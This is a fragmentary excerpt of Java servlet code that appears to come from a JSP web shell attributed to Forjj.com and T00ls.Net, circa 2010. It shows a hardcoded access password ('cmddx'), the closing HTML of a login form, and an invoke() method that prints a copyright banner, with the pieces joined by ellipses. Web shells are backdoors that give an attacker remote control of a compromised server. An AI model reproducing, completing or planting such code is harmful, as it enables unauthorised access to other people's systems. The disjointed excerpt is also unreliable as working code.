...
* CY . I Love You.
*/
private static final String PW = "cmddx"; //password
...
"<!--<span style=\"font:11px Verdana;\">Copyright &copy; 2010 NinTy </span><a href=\"\" target=\"_blank\"></a>--></p>"+
"    </form></body></html>");
} catch (Exception e) {
...
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
response.getWriter().println("<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">Copyright (C) 2010 <a href=\"www.forjj.com\" target=\"_blank\">www.Forjj.com/</a>&nbsp;&nbsp;<a target=\"_blank\" href=\"www.t00ls.net/\">[T00ls.Net]</a> All Rights Reserved."+
"</div>");
} catch (Exception e) {
